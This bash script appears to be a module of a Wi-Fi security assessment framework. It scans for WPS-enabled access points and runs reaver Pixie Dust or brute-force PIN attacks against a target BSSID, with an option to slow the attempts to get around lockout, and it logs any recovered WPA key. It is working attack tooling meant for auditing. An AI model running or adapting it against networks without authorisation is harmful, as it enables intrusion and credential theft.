#!/usr/bin/env bash
# MODULE_META
# NAME="WPS Vulnerability Testing"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="wash,reaver,bully"
# DESC="Detect WPS-enabled APs and test for PIN/PBC vulnerabilities"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d3_wps_testing.sh
#  D3: WPS Vulnerability Testing (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Scan for WPS-enabled APs using 'wash'.
#  2. Interactive selection: Pixie Dust (Fast) vs Online Brute-Force (Loud).
#  3. Optional: Configure delay/rate-limiting to bypass lockouts.
#  4. Smart Exit upon successful recovery.
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-300}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D3"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] MONITOR_INTERFACE not set."
    exit 1
fi

# 1. Scan Phase
echo "[*] Scanning for WPS-enabled networks..."
WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>/dev/null || true

# 2. Tactical Selection
if [[ -n "$BSSID" ]]; then
    echo "[?] Select WPS Attack Vector for ${BSSID}:"
    echo "    1) Pixie Dust (Fast, 1 transaction)"
    echo "    2) Online Brute-Force (Sequential guessing)"
    read -p "Selection [1/2]: " attack_choice

    REAVER_ARGS="-i $INTERFACE -b $BSSID"
    [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"

    if [[ "$attack_choice" == "1" ]]; then
        echo "[*] Initializing Pixie Dust attack..."
        REAVER_ARGS+=" -K 1"
    else
        read -p "[?] Enter delay between attempts (seconds, e.g. 300 to bypass lockout): " delay
        [[ -n "$delay" ]] && REAVER_ARGS+=" -d $delay"
        echo "[!] WARNING: Online brute-force is loud and will trigger WIDS."
    fi

    echo "[*] Starting reaver with tactical parameters..."
    INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
    reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 &
    REAVER_PID=$!
    
    # 3. Smart Exit Polling
    ELAPSED=0
    SUCCESS=0
    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
        if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE"; then
            echo "[!] SUCCESS: WPS DATA RECOVERED!"
            SUCCESS=1
            break
        fi
        if ! kill -0 "$REAVER_PID" 2>/dev/null; then
            echo "[*] Reaver process terminated."
            break
        fi
        sleep 5
        ((ELAPSED+=5))
    done
    
    kill "$REAVER_PID" 2>/dev/null || true
    wait "$REAVER_PID" 2>/dev/null || true
    
    if [[ $SUCCESS -eq 1 ]]; then
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "WPS Attack Successful" \
            --severity CRITICAL \
            --desc "Successfully recovered credentials for BSSID ${BSSID} via reaver." \
            --evidence "$INFO_FILE" \
            --rationale "Successful WPS exploitation bypasses the need for complex handshake cracking."
    else
        echo "[+] WPS audit complete. No data recovered in this window."
        "$ASTRA_BIN" record-finding \
            --session-dir "$SESSION_DIR" \
            --tc "$TC_ID" \
            --type vulnerability \
            --name "[$TC_ID] Audit Complete" \
            --severity INFO \
            --desc "Attempted WPS exploitation on ${BSSID}. No results obtained." \
            --evidence "$INFO_FILE" \
            --rationale "Attack failure suggests AP hardening or rate-limiting."
    fi
else
    # General report
    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE")
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPS Audit Complete" \
        --severity INFO \
        --desc "Identified ${WPS_COUNT} networks with WPS enabled." \
        --evidence "$WASH_FILE" \
        --rationale "WPS status identifies high-risk targets for further assessment."
fi

exit 0
